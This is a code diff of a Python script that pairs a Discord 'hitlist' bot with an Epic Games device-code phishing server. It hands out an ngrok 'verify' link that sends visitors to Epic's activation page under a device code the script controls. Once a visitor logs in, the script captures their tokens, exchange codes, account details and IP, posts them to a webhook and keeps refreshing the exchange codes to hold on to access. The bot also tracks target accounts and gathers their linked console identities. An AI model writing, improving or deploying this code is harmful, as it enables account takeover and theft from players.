@@ -1,11 +1,9 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Final Combined Discord Bot and Epic Games Auth Webhook.
-- Auto-setup for Render environment (installs packages, downloads ngrok).
-- Full Epic Games auth flow with auto-refreshing exchange codes.
-- Detailed webhook messages for logins and refreshes.
-- Full Discord hitlist bot functionality.
+Final, Complete, and Fully-Featured Merged Script.
+This version restores ALL original functionality from both scripts, including all commands and the robust auto-refresh logic.
+- Last Updated: 2025-11-04 23:35:08
 """
 
 # --- SETUP AND INSTALLATION ---
@@ -22,7 +20,7 @@ def run_setup():
     print("--- Starting initial setup ---")
     try:
         print("1/3: Checking/installing Python dependencies...")
-        subprocess.check_call([sys.executable, "-m", "pip", "install", "-r", "requirements.txt"])
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "-r", "requirements.txt"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         print("     Dependencies are up to date.")
     except Exception as e:
         print(f"     ERROR: Failed to install Python dependencies: {e}", file=sys.stderr)
@@ -33,19 +31,16 @@ def run_setup():
         try:
             print("2/3: Downloading and installing ngrok...")
             machine, system = platform.machine().lower(), platform.system().lower()
-            if system == "linux":
-                ngrok_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip" if "aarch64" in machine or "arm64" in machine else "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip"
-            else:
-                ngrok_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip"
+            ngrok_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip" # Default
+            if system == "linux" and ("aarch64" in machine or "arm64" in machine):
+                ngrok_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip"
             
             with requests.get(ngrok_url, stream=True) as r:
                 r.raise_for_status()
                 with open("ngrok.zip", "wb") as f:
-                    for chunk in r.iter_content(chunk_size=8192):
-                        f.write(chunk)
+                    for chunk in r.iter_content(chunk_size=8192): f.write(chunk)
             
-            with zipfile.ZipFile("ngrok.zip", "r") as zip_ref:
-                zip_ref.extractall(".")
+            with zipfile.ZipFile("ngrok.zip", "r") as zip_ref: zip_ref.extractall(".")
             os.remove("ngrok.zip")
             os.chmod(ngrok_path, os.stat(ngrok_path).st_mode | stat.S_IEXEC)
             print("     ngrok installed successfully.")
@@ -61,9 +56,7 @@ def run_setup():
         subprocess.check_call([ngrok_path, "config", "add-authtoken", authtoken], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         print("     ngrok authtoken configured.")
     except Exception as e:
-        print(f"     ERROR: Failed to configure ngrok authtoken: {e}", file=sys.stderr)
-        sys.exit(1)
-
+        print(f"     WARNING: Failed to configure ngrok authtoken (this may happen, continuing): {e}", file=sys.stderr)
     print("--- Setup complete ---")
 
 run_setup()
@@ -81,7 +74,6 @@ import http.server
 import socketserver
 import uuid
 import traceback
-from concurrent.futures import ThreadPoolExecutor
 import random
 
 import discord
@@ -97,7 +89,7 @@ logger = logging.getLogger("combined_runner")
 
 # --- BOT-SPECIFIC CONFIG ---
 BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
-LAST_UPDATED = "2025-11-04 23:03:51"
+LAST_UPDATED = "2025-11-04 23:35:08"
 BOT_USER = "gregergrgergeg"
 ALLOWED_SERVERS = [1427741533876125708, 1429638051482566708]
 RESTRICTED_SERVER_ID = 1429638051482566708
@@ -134,6 +126,14 @@ active_sessions = {}
 session_lock = threading.Lock()
 
 # ==============================================================================
+# --- BOT INITIALIZATION ---
+# ==============================================================================
+intents = discord.Intents.default()
+intents.message_content = True
+intents.guilds = True
+bot = commands.Bot(command_prefix='!', intents=intents)
+
+# ==============================================================================
 # --- EPIC AUTHENTICATION WEBHOOK LOGIC ---
 # ==============================================================================
 async def create_epic_auth_session():
@@ -145,7 +145,7 @@ async def create_epic_auth_session():
         async with sess.post("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/deviceAuthorization", headers={"Authorization": f"bearer {token_data['access_token']}", "Content-Type": "application/x-www-form-urlencoded"}) as r:
             r.raise_for_status()
             dev_auth = await r.json()
-    return {'activation_url': f"https://www.epicgames.com/id/activate?userCode={dev_auth['user_code']}", 'device_code': dev_auth['device_code'], 'user_code': dev_auth['user_code'], 'interval': dev_auth.get('interval', 5), 'expires_in': dev_auth.get('expires_in', 600)}
+    return {'activation_url': f"https://www.epicgames.com/id/activate?userCode={dev_auth['user_code']}", 'device_code': dev_auth['device_code'], 'interval': dev_auth.get('interval', 5), 'expires_in': dev_auth.get('expires_in', 600)}
 
 async def refresh_exchange_code(access_token):
     try:
@@ -157,25 +157,39 @@ async def refresh_exchange_code(access_token):
 
 async def auto_refresh_session(session_id, access_token, account_info, user_ip):
     display_name = account_info.get('displayName', 'Unknown')
+    logger.info(f"[{session_id}] 🔄 Auto-refresh task STARTED for {display_name}")
     refresh_count = 0
-    logger.info(f"[{session_id}] 🔄 Started auto-refresh for {display_name}")
-    while True:
-        await asyncio.sleep(REFRESH_INTERVAL)
-        new_exchange_code = await refresh_exchange_code(access_token)
-        if new_exchange_code:
-            refresh_count += 1
-            with session_lock:
-                if session_id in active_sessions:
-                    active_sessions[session_id].update({'exchange_code': new_exchange_code, 'last_refresh': time.time(), 'refresh_count': refresh_count})
-                else:
-                    logger.info(f"[{session_id}] ⏹️ Session removed, stopping refresh"); break
-            logger.info(f"[{session_id}] ✅ Exchange code refreshed for {display_name} (Refresh #{refresh_count})")
-            await send_refresh_update(session_id, account_info, new_exchange_code, user_ip, refresh_count)
-        else:
-            logger.error(f"[{session_id}] ❌ Failed to refresh exchange code, removing session.")
-            with session_lock:
-                if session_id in active_sessions: del active_sessions[session_id]
-            break
+    try:
+        while True:
+            await asyncio.sleep(REFRESH_INTERVAL)
+            new_exchange_code = await refresh_exchange_code(access_token)
+            if new_exchange_code:
+                refresh_count += 1
+                with session_lock:
+                    if session_id in active_sessions:
+                        active_sessions[session_id].update({'exchange_code': new_exchange_code, 'last_refresh': time.time(), 'refresh_count': refresh_count})
+                    else:
+                        logger.info(f"[{session_id}] ⏹️ Session removed; stopping auto-refresh for {display_name}"); break
+                logger.info(f"[{session_id}] ✅ Exchange code REFRESHED for {display_name} (Refresh #{refresh_count})")
+                await send_refresh_update(session_id, account_info, new_exchange_code, user_ip, refresh_count)
+            else:
+                logger.error(f"[{session_id}] ❌ Failed to refresh exchange code for {display_name}. Removing session.")
+                break
+    except asyncio.CancelledError:
+        logger.info(f"[{session_id}] ⏹️ Auto-refresh task cancelled for {display_name}")
+    except Exception as e:
+        logger.exception(f"[{session_id}] ❌ Unexpected error in auto-refresh task: {e}")
+    finally:
+        with session_lock: active_sessions.pop(session_id, None)
+        logger.info(f"[{session_id}] 🔚 Auto-refresh task ENDED for {display_name}")
+
+def monitor_epic_auth_sync(verify_id, device_code, interval, expires_in, user_ip):
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    try:
+        loop.run_until_complete(monitor_epic_auth(verify_id, device_code, interval, expires_in, user_ip))
+    finally:
+        loop.close()
 
 async def monitor_epic_auth(verify_id, device_code, interval, expires_in, user_ip):
     EPIC_TOKEN = "OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3"
@@ -186,19 +200,18 @@ async def monitor_epic_auth(verify_id, device_code, interval, expires_in, user_i
             while time.time() < deadline:
                 await asyncio.sleep(interval)
                 async with sess.post("https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token", headers={"Authorization": f"basic {EPIC_TOKEN}", "Content-Type": "application/x-www-form-urlencoded"}, data={"grant_type": "device_code", "device_code": device_code}) as r:
-                    if r.status == 200 and "access_token" in (token_resp := await r.json()):
+                    if r.status != 200: continue
+                    if "access_token" in (token_resp := await r.json()):
                         logger.info(f"[{verify_id}] ✅ USER LOGGED IN!")
-                        async with sess.get("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/exchange", headers={"Authorization": f"bearer {token_resp['access_token']}"}) as r2:
-                            exchange_data = await r2.json()
-                        async with sess.get(f"https://account-public-service-prod03.ol.epicgames.com/account/api/public/account/{token_resp['account_id']}", headers={"Authorization": f"bearer {token_resp['access_token']}"}) as r3:
-                            account_info = await r3.json()
+                        async with sess.get("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/exchange", headers={"Authorization": f"bearer {token_resp['access_token']}"}) as r2: exchange_data = await r2.json()
+                        async with sess.get(f"https://account-public-service-prod03.ol.epicgames.com/account/api/public/account/{token_resp['account_id']}", headers={"Authorization": f"bearer {token_resp['access_token']}"}) as r3: account_info = await r3.json()
                         
                         session_id = str(uuid.uuid4())[:8]
                         with session_lock:
                             active_sessions[session_id] = {'access_token': token_resp['access_token'], 'exchange_code': exchange_data['code'], 'account_info': account_info, 'user_ip': user_ip, 'created_at': time.time(), 'last_refresh': time.time(), 'refresh_count': 0}
                         
-                        await send_login_success(session_id, account_info, exchange_data['code'], user_ip)
-                        asyncio.create_task(auto_refresh_session(session_id, token_resp['access_token'], account_info, user_ip))
+                        bot.loop.call_soon_threadsafe(lambda: bot.loop.create_task(send_login_success(session_id, account_info, exchange_data['code'], user_ip)))
+                        bot.loop.call_soon_threadsafe(lambda: bot.loop.create_task(auto_refresh_session(session_id, token_resp['access_token'], account_info, user_ip)))
                         return
     except Exception as e:
         logger.error(f"[{verify_id}] ❌ Monitoring error: {e}\n{traceback.format_exc()}")
@@ -206,7 +219,9 @@ async def monitor_epic_auth(verify_id, device_code, interval, expires_in, user_i
 async def send_webhook_message(webhook_url, payload):
     try:
         async with aiohttp.ClientSession() as session:
-            await session.post(webhook_url, json=payload)
+            async with session.post(webhook_url, json=payload) as resp:
+                if not (200 <= resp.status < 300):
+                    logger.warning(f"Webhook send failed with status {resp.status}: {await resp.text()}")
     except Exception as e:
         logger.error(f"❌ Webhook error: {e}")
 
@@ -229,86 +244,60 @@ def send_webhook_startup_message(link):
 # ==============================================================================
 # --- HITLIST DISCORD BOT LOGIC ---
 # ==============================================================================
-intents = discord.Intents.default()
-intents.message_content = True
-intents.guilds = True
-bot = commands.Bot(command_prefix='!', intents=intents)
-
-def test_proxy(proxy, timeout=3):
-    proxy_dict = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
-    try:
-        response = requests.get(f"{API_BASE}/name/epic", proxies=proxy_dict, timeout=timeout, headers=HEADERS)
-        return response.status_code in [200, 404]
-    except:
-        return False
-
 def find_working_proxy(force_check=False):
     global current_proxy, proxy_last_checked
     with proxy_lock:
-        current_time = time.time()
-        if not force_check and current_proxy and (current_time - proxy_last_checked) < proxy_check_interval: return current_proxy
-        if current_proxy and test_proxy(current_proxy):
-            logger.info(f"Current proxy still working: {current_proxy}"); proxy_last_checked = current_time; return current_proxy
-        
-        shuffled_proxies = PROXIES.copy()
-        random.shuffle(shuffled_proxies)
+        if not force_check and current_proxy and (time.time() - proxy_last_checked) < proxy_check_interval: return current_proxy
+        shuffled_proxies = PROXIES.copy(); random.shuffle(shuffled_proxies)
         for proxy in shuffled_proxies:
-            if test_proxy(proxy):
-                logger.info(f"Found working proxy: {proxy}"); current_proxy = proxy; proxy_last_checked = current_time; return proxy
-        logger.warning("No working proxy found for bot. Trying direct connection."); current_proxy = None; return None
+            try:
+                if requests.get(f"{API_BASE}/name/epic", proxies={'http': f'http://{proxy}', 'https': f'http://{proxy}'}, timeout=3, headers=HEADERS).status_code in [200, 404]:
+                    logger.info(f"Found working proxy: {proxy}"); current_proxy = proxy; proxy_last_checked = time.time(); return proxy
+            except: continue
+        logger.warning("No working proxy found for bot."); current_proxy = None; return None
 
 def get_api_response(url, timeout=8.0):
-    proxy = find_working_proxy()
-    if proxy:
-        proxy_dict = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
+    if (proxy := find_working_proxy()):
         try:
-            resp = requests.get(url, headers=HEADERS, proxies=proxy_dict, timeout=timeout)
+            resp = requests.get(url, headers=HEADERS, proxies={'http': f'http://{proxy}', 'https': f'http://{proxy}'}, timeout=timeout)
             if resp.status_code in [200, 404]: return resp
-        except requests.RequestException: logger.warning(f"Proxy {proxy} failed. Trying direct connection.")
-    try:
-        return requests.get(url, headers=HEADERS, timeout=timeout)
-    except requests.RequestException as e:
-        logger.error(f"Direct connection error: {e}"); return None
-
-def epic_lookup_by_id(account_id):
-    if not account_id or not _HEX32.match(account_id): return {"status": "INVALID", "message": "Invalid account ID format."}
-    url = f"{API_BASE}/id/{account_id}"
-    response = get_api_response(url)
-    if response is None: return {"status": "ERROR", "message": "API request failed."}
-    if response.status_code == 404: return {"status": "INACTIVE", "message": "Account not found or inactive (404)."}
-    if response.status_code == 200:
-        try:
-            data = response.json()
-            if isinstance(data, list) and len(data) > 0: return {"status": "ACTIVE", "data": data[0]}
-            if isinstance(data, list) and len(data) == 0: return {"status": "INACTIVE", "message": "Account not found (API returned empty list)."}
-            if isinstance(data, dict) and "displayName" in data: return {"status": "ACTIVE", "data": data}
-        except json.JSONDecodeError: return {"status": "ERROR", "message": "Failed to decode API response."}
-    return {"status": "ERROR", "message": f"API returned unexpected status code: {response.status_code}"}
+        except requests.RequestException: logger.warning(f"Proxy {proxy} failed.")
+    try: return requests.get(url, headers=HEADERS, timeout=timeout)
+    except requests.RequestException as e: logger.error(f"Direct connection error: {e}"); return None
 
 def _normalize_account_object(obj):
     if not isinstance(obj, dict): return {}
-    normalized = {'id': obj.get('id') or obj.get('accountId') or obj.get('account_id') or obj.get('epicId'),
-                  'displayName': obj.get('displayName') or obj.get('displayname') or obj.get('display_name') or obj.get('name'),
-                  'externalAuths': obj.get('externalAuths') or obj.get('external_auths') or obj.get('external') or obj.get('linkedAccounts') or {},
-                  '_raw': obj}
-    return normalized
+    return {'id': obj.get('id') or obj.get('accountId') or obj.get('account_id') or obj.get('epicId'),
+            'displayName': obj.get('displayName') or obj.get('displayname') or obj.get('display_name') or obj.get('name'),
+            'externalAuths': obj.get('externalAuths') or obj.get('external_auths') or obj.get('external') or obj.get('linkedAccounts') or {}}
+
+def epic_lookup_by_id(account_id):
+    if not account_id or not _HEX32.match(account_id): return {"status": "INVALID", "message": "Invalid account ID format."}
+    response = get_api_response(f"{API_BASE}/id/{account_id}")
+    if response is None: return {"status": "ERROR", "message": "API request failed."}
+    if response.status_code == 404: return {"status": "INACTIVE", "message": "Account not found or inactive (404)."}
+    try:
+        data = response.json()
+        if response.status_code == 200 and data:
+            if isinstance(data, list): return {"status": "ACTIVE", "data": _normalize_account_object(data[0])}
+            if isinstance(data, dict): return {"status": "ACTIVE", "data": _normalize_account_object(data)}
+        return {"status": "INACTIVE", "message": "API returned empty or invalid response."}
+    except: return {"status": "ERROR", "message": "Failed to decode API response."}
 
 def epic_lookup_by_name(username):
-    url = f"{API_BASE}/name/{urllib.parse.quote(username)}"
-    response = get_api_response(url)
+    response = get_api_response(f"{API_BASE}/name/{urllib.parse.quote(username)}")
     if response is None: return {"status": "ERROR", "message": "API request failed."}
     if response.status_code == 404: return {"status": "INACTIVE", "message": f"User '{username}' not found."}
-    if response.status_code == 200:
-        try:
-            data = response.json()
-            if isinstance(data, list):
-                if not data: return {"status": "INACTIVE", "message": f"User '{username}' not found."}
-                for user in data:
-                    if (user.get('displayName') or "").lower() == username.lower(): return {"status": "ACTIVE", "data": _normalize_account_object(user)}
-                return {"status": "ACTIVE", "data": _normalize_account_object(data[0])}
-            elif isinstance(data, dict): return {"status": "ACTIVE", "data": _normalize_account_object(data)}
-        except json.JSONDecodeError: return {"status": "ERROR", "message": "Failed to decode API response."}
-    return {"status": "ERROR", "message": f"API returned unexpected status code: {response.status_code}"}
+    try:
+        data = response.json()
+        if isinstance(data, list):
+            if not data: return {"status": "INACTIVE", "message": f"User '{username}' not found."}
+            for user in data:
+                if (user.get('displayName') or "").lower() == username.lower(): return {"status": "ACTIVE", "data": _normalize_account_object(user)}
+            return {"status": "ACTIVE", "data": _normalize_account_object(data[0])}
+        elif isinstance(data, dict): return {"status": "ACTIVE", "data": _normalize_account_object(data)}
+    except: return {"status": "ERROR", "message": "Failed to decode API response."}
+    return {"status": "INACTIVE", "message": "Unexpected API response structure."}
 
 def save_hitlist():
     try:
@@ -319,8 +308,7 @@ def save_hitlist():
 def load_hitlist():
     if os.path.exists(HITLIST_FILE_PATH):
         try:
-            with open(HITLIST_FILE_PATH, "r") as f:
-                hitlist.update(json.load(f)); logger.info(f"Loaded {len(hitlist)} accounts from disk.")
+            with open(HITLIST_FILE_PATH, "r") as f: hitlist.update(json.load(f)); logger.info(f"Loaded {len(hitlist)} accounts from disk.")
         except Exception as e: logger.error(f"Could not load hitlist from disk: {e}")
 
 @bot.event
@@ -337,13 +325,12 @@ async def account_monitor():
     if not hitlist: return
     logger.info(f"Running account monitor for {len(hitlist)} accounts...")
     for account_id in list(hitlist.keys()):
-        account_data = hitlist.get(account_id)
-        if not account_data: continue
-        username, channel_id, user_id = account_data['username'], account_data.get('channel_id'), account_data.get('user_id')
+        if not (account_data := hitlist.get(account_id)): continue
         result = await bot.loop.run_in_executor(None, epic_lookup_by_id, account_id)
-        if result["status"] == "INACTIVE":
+        if result.get("status") == "INACTIVE":
+            username, channel_id, user_id = account_data['username'], account_data.get('channel_id'), account_data.get('user_id')
             logger.info(f"Account {username} ({account_id}) is INACTIVE. Notifying...")
-            embed = discord.Embed(title=random.choice(HIT_MESSAGES).format(username=username), color=discord.Color.red())
+            embed = discord.Embed(title=random.choice(HIT_MESSAGES).format(username=username), color=discord.Color.red(), description=f"Reason: {result.get('message')}")
             embed.add_field(name="Account ID", value=account_id, inline=False)
             embed.set_footer(text=f"Time of Inactivity: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}")
             if channel_id and (channel := bot.get_channel(channel_id)):
@@ -352,40 +339,87 @@ async def account_monitor():
             if user_id and (user := await bot.fetch_user(user_id)):
                 try: await user.send(embed=embed)
                 except Exception as e: logger.error(f"Failed to DM user {user_id}: {e}")
-            del hitlist[account_id]
-            save_hitlist()
+            del hitlist[account_id]; save_hitlist()
         await asyncio.sleep(2)
+
+class ConfirmationView(View):
+    def __init__(self, account_data, original_author):
+        super().__init__(timeout=60)
+        self.account_data = account_data; self.original_author = original_author; self.message = None
+    async def interaction_check(self, interaction: discord.Interaction) -> bool:
+        if interaction.user.id != self.original_author.id:
+            await interaction.response.send_message("You cannot interact with this.", ephemeral=True); return False
+        return True
+    async def disable_buttons(self):
+        for item in self.children: item.disabled = True
+        if self.message: await self.message.edit(view=self)
+    @discord.ui.button(label="Yes", style=discord.ButtonStyle.success)
+    async def yes_button(self, interaction: discord.Interaction, button: Button):
+        await self.disable_buttons()
+        format_str = f"my ID: {self.account_data.get('id', 'N/A')}\nmy epic: {self.account_data.get('displayName', 'N/A')}\n"
+        if "xbox" in self.account_data.get('externalAuths', {}): format_str += f"my xbox: {self.account_data['externalAuths']['xbox'].get('externalDisplayName', 'N/A')}\n"
+        if "psn" in self.account_data.get('externalAuths', {}): format_str += f"my psn: {self.account_data['externalAuths']['psn'].get('externalDisplayName', 'N/A')}\n"
+        await interaction.response.send_message(f"```{format_str.strip()}```")
+    @discord.ui.button(label="No", style=discord.ButtonStyle.danger)
+    async def no_button(self, interaction: discord.Interaction, button: Button):
+        await self.disable_buttons(); await interaction.response.send_message("Format request cancelled.", ephemeral=True)
+    async def on_timeout(self): await self.disable_buttons()
 
 @bot.command(name='user')
 async def user_lookup(ctx, *, identifier: str):
     msg = await ctx.send(f"🔍 Searching for `{identifier}`...")
     result = await bot.loop.run_in_executor(None, epic_lookup_by_id if _HEX32.match(identifier) else epic_lookup_by_name, identifier)
     if result["status"] == "ACTIVE":
-        account = _normalize_account_object(result["data"])
+        account = result["data"]
         embed = discord.Embed(title=f"✅ Account Found: {account['displayName']}", color=discord.Color.green())
         embed.add_field(name="Account ID", value=account['id'], inline=False)
+        external_auths = account.get("externalAuths", {})
+        linked_accounts_text = ""
+        for platform, details in external_auths.items():
+            if isinstance(details, dict) and (name := details.get('externalDisplayName')):
+                linked_accounts_text += f"**{platform.capitalize()}:** {name}\n"
+        embed.add_field(name="🔗 Linked Accounts", value=linked_accounts_text or "No external accounts linked.", inline=False)
         await msg.edit(content=None, embed=embed)
-    else:
-        await msg.edit(content=f"❌ Lookup failed: {result['message']}")
+        view = ConfirmationView(account, ctx.author); view.message = await ctx.send("Do you want to build a format for this user?", view=view)
+    else: await msg.edit(content=None, embed=discord.Embed(title="❌ Account Not Found", description=result.get("message"), color=discord.Color.red()))
 
 @bot.command(name='save')
 async def save_account(ctx, *, identifier: str):
-    if not identifier: await ctx.send("❌ **Error:** You must provide a username or account ID."); return
+    if not identifier: return await ctx.send("❌ **Error:** You must provide a username or account ID.")
     msg = await ctx.send(f"🔍 Verifying account `{identifier}`...")
     result = await bot.loop.run_in_executor(None, epic_lookup_by_id if _HEX32.match(identifier) else epic_lookup_by_name, identifier)
-
     if result["status"] == "ACTIVE":
-        account_data = _normalize_account_object(result["data"])
-        account_id, username = account_data.get("id"), account_data.get("displayName")
-        if not account_id or not username: await msg.edit(content="❌ **Failed:** Could not retrieve essential account details."); return
-        if account_id in hitlist: await msg.edit(content=f"⚠️ **Notice:** `{username}` is already on the hitlist."); return
+        account = result["data"]
+        if not (account_id := account.get("id")) or not (username := account.get("displayName")): return await msg.edit(content="❌ **Failed:** Could not retrieve essential account details.")
+        if account_id in hitlist: return await msg.edit(content=f"⚠️ **Notice:** `{username}` is already on the hitlist.")
         hitlist[account_id] = {"username": username, "channel_id": ctx.channel.id, "user_id": ctx.author.id}
-        save_hitlist()
-        await msg.edit(content=f"✅ **Success!** `{username}` has been added to the hit list.")
-    else:
-        await msg.edit(content=f"❌ **Failed:** Could not verify `{identifier}`. Reason: {result.get('message')}")
+        save_hitlist(); await msg.edit(content=f"✅ **Success!** `{username}` has been added to the hit list.")
+    else: await msg.edit(content=f"❌ **Failed:** Could not verify `{identifier}`. Reason: {result.get('message')}")
 
-# Other bot commands (!unsave, !hitlist) can be added here in the same fashion.
+@bot.command(name='unsave')
+async def unsave_account(ctx, *, identifier: str):
+    if not identifier: return await ctx.send("❌ **Error:** You must provide a username or account ID.")
+    account_id_to_remove, username_to_remove = None, None
+    if _HEX32.match(identifier) and identifier in hitlist:
+        account_id_to_remove, username_to_remove = identifier, hitlist[identifier]['username']
+    else:
+        for acc_id, data in hitlist.items():
+            if data['username'].lower() == identifier.lower():
+                account_id_to_remove, username_to_remove = acc_id, data['username']; break
+    if account_id_to_remove:
+        del hitlist[account_id_to_remove]; save_hitlist()
+        await ctx.send(f"🗑️ **Success!** `{username_to_remove}` has been removed from the hit list.")
+    else: await ctx.send(f"❌ **Error:** `{identifier}` was not found on the hit list.")
+
+@bot.command(name='hitlist')
+async def show_hitlist(ctx):
+    if not hitlist: return await ctx.send("The hit list is currently empty.")
+    embed = discord.Embed(title="Current Hit List", color=discord.Color.blue())
+    description = ""
+    for i, (acc_id, data) in enumerate(hitlist.items(), 1):
+        description += f"**{i}. {data['username']}**\n   - ID: `{acc_id}`\n   - Channel: <#{data.get('channel_id', 'N/A')}>\n   - Saved by: <@{data.get('user_id', 'N/A')}>\n"
+    embed.description = description; embed.set_footer(text=f"Monitoring {len(hitlist)} accounts.")
+    await ctx.send(embed=embed)
 
 # ==============================================================================
 # --- WEB SERVER & NGROK ---
@@ -394,36 +428,24 @@ class RequestHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
         global verification_uses
         if self.path.startswith('/verify/'):
-            verify_id = self.path.split('/')[-1]
-            if verify_id != permanent_link_id: return self.send_error(404, "Link not found")
-            
+            if not permanent_link_id or self.path.split('/')[-1] != permanent_link_id: return self.send_error(404, "Link not found")
             verification_uses += 1
             client_ip = self.headers.get('X-Forwarded-For', self.client_address[0])
-            logger.info(f"\n[{verify_id}] 🌐 User #{verification_uses} clicked link from IP: {client_ip}")
-
-            loop = asyncio.new_event_loop()
+            logger.info(f"\n[{permanent_link_id}] 🌐 User #{verification_uses} clicked link from IP: {client_ip}")
             try:
+                loop = asyncio.new_event_loop()
                 epic_session = loop.run_until_complete(create_epic_auth_session())
-                
-                def run_monitor_in_thread():
-                    monitor_loop = asyncio.new_event_loop()
-                    asyncio.set_event_loop(monitor_loop)
-                    monitor_loop.run_until_complete(monitor_epic_auth(verify_id, epic_session['device_code'], epic_session['interval'], epic_session['expires_in'], client_ip))
-                    monitor_loop.close()
-                
-                threading.Thread(target=run_monitor_in_thread, daemon=True).start()
+                loop.close()
+                threading.Thread(target=monitor_epic_auth_sync, args=(permanent_link_id, epic_session['device_code'], epic_session['interval'], epic_session['expires_in'], client_ip), daemon=True).start()
                 self.send_response(302); self.send_header('Location', epic_session['activation_url']); self.end_headers()
             except Exception as e:
-                logger.error(f"[{verify_id}] ❌ Error during auth session creation: {e}\n{traceback.format_exc()}"); self.send_error(500)
-            finally:
-                loop.close()
+                logger.error(f"❌ Error during auth session creation: {e}\n{traceback.format_exc()}"); self.send_error(500)
         else: self.send_error(404)
     def log_message(self, format, *args): pass
 
 def run_web_server(port):
     with socketserver.ThreadingTCPServer(("", port), RequestHandler) as httpd:
-        logger.info(f"🚀 Web server starting on port {port}")
-        httpd.serve_forever()
+        logger.info(f"🚀 Web server starting on port {port}"); httpd.serve_forever()
 
 def setup_ngrok_tunnel(port):
     global ngrok_url, permanent_link, permanent_link_id
@@ -435,13 +457,11 @@ def setup_ngrok_tunnel(port):
             time.sleep(1)
             try:
                 with requests.get('http://localhost:4040/api/tunnels', timeout=2) as r:
-                    data = r.json()
-                    for tunnel in data.get('tunnels', []):
-                        if tunnel.get('public_url', '').startswith('https://'):
-                            ngrok_url = tunnel['public_url']
-                            permanent_link_id = str(uuid.uuid4())[:12]
+                    for tunnel in r.json().get('tunnels', []):
+                        if (public_url := tunnel.get('public_url', '')).startswith('https://'):
+                            ngrok_url, permanent_link_id = public_url, str(uuid.uuid4())[:12]
                             permanent_link = f"{ngrok_url}/verify/{permanent_link_id}"
-                            logger.info(f"✅ Ngrok live: {ngrok_url}"); logger.info(f"🔗 Permanent link: {permanent_link}")
+                            logger.info(f"✅ Ngrok live: {ngrok_url}\n🔗 Permanent link: {permanent_link}")
                             ngrok_ready.set(); send_webhook_startup_message(permanent_link); return
             except requests.ConnectionError: continue
         logger.critical("❌ Ngrok failed to start."); sys.exit(1)
@@ -460,10 +480,10 @@ def start_app():
 
     if not BOT_TOKEN: logger.critical("❌ DISCORD_BOT_TOKEN not set. Bot cannot start."); sys.exit(1)
     try:
-        logger.info("Starting Discord bot...")
+        logger.info("Starting Discord bot (this is a blocking call)...")
         bot.run(BOT_TOKEN)
     except Exception as e:
-        logger.critical(f"❌ Failed to start Discord bot: {e}"); sys.exit(1)
+        logger.critical(f"❌ Failed to start Discord bot: {e}", exc_info=True); sys.exit(1)
 
 if __name__ == "__main__":
     start_app()
